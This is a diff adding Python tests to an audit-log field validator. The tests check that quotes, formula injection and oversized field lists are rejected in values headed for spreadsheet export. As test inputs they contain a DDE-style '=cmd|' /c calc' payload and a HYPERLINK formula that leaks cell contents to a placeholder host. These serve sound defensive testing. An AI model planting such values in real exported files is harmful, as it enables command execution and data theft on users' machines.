@@ -327,3 +327,65 @@ def test_an_ipv6_address_fits_the_source_address_cap() -> None:
     longest = "1234:1234:1234:1234:1234:1234:255.255.255.255"
     assert len(longest) == validation.FIELD_LIMITS["source_ip"]
     assert validation.normalise_fields(fixed_entry(source_ip=longest))["source_ip"] == longest
+
+
+@pytest.mark.parametrize(
+    "field", ["actor", "action", "resource", "resource_id", "user_agent", "fields_changed"]
+)
+def test_a_double_quote_is_rejected_in_every_field(field: str) -> None:
+    """The evidence pack is exported to a spreadsheet, so a quote is a field terminator.
+
+    The leading-character guard could not see this: a value can carry its own quote, close
+    its comma-separated field, and land a formula in the NEXT cell, which is the harm the
+    guard exists to prevent. No field here has a legitimate use for a double quote.
+    """
+    value = "Mozilla/5.0\",\"=cmd|' /c calc'!A1" if field == "user_agent" else 'a"b'
+    with pytest.raises(validation.AuditFieldError, match="outside printable ASCII"):
+        validation.normalise_fields(fixed_entry(**{field: value}))
+
+
+def test_a_formula_smuggled_through_a_quote_break_is_rejected() -> None:
+    """The concrete attack, end to end."""
+    with pytest.raises(validation.AuditFieldError):
+        validation.normalise_fields(
+            fixed_entry(actor='ash@x.uk,=HYPERLINK("http://example.invalid/"&A1,"ok")')
+        )
+
+
+def test_a_field_name_list_is_capped_at_a_realistic_length() -> None:
+    """A change touches a handful of fields, not a paragraph.
+
+    The previous 512-byte cap accepted a whole free-text sentence spelled in snake case,
+    which is record content wearing a field name's clothes.
+    """
+    assert validation.FIELD_LIMITS["fields_changed"] == 128
+    sentence = "jane_doe_reported_theft_of_her_laptop_at_home_address_12_example_street_reading"
+    padded = f"{sentence},{sentence}"
+    with pytest.raises(validation.AuditFieldError, match="over its cap"):
+        validation.normalise_fields(fixed_entry(fields_changed=padded))
+
+
+@pytest.mark.parametrize("token", ["HIGGINS", "ASHLEY_HIGGINS", "SW1A1AA"])
+def test_a_single_upper_case_token_is_accepted_and_that_is_the_documented_limit(
+    token: str,
+) -> None:
+    """Pins the WEAKNESS, so nobody restates the rule as an impossibility again.
+
+    A surname, a full name in upper snake case, and a postcode without its space all
+    satisfy the state rule. The rule rejects the common shapes of record content, which is
+    a large reduction in surface and not a guarantee. Making it a guarantee needs a closed
+    state vocabulary, which is not definable until the real state set is knowable. If this
+    test starts failing because a closed vocabulary landed, delete it and say so.
+    """
+    assert validation.normalise_fields(fixed_entry(new_state=token))["new_state"] == token
+
+
+def test_the_two_required_field_lists_cannot_drift() -> None:
+    """One rule, expressed in two modules, so it needs an assertion the way FIELD_ORDER does.
+
+    Divergence fails closed in one direction and is silently weaker in the other, which is
+    the direction that matters.
+    """
+    from complyops.audit import hashing  # noqa: PLC0415
+
+    assert hashing._REQUIRED_NON_EMPTY - {"\x00key_id"} == set(validation.REQUIRED_FIELDS)
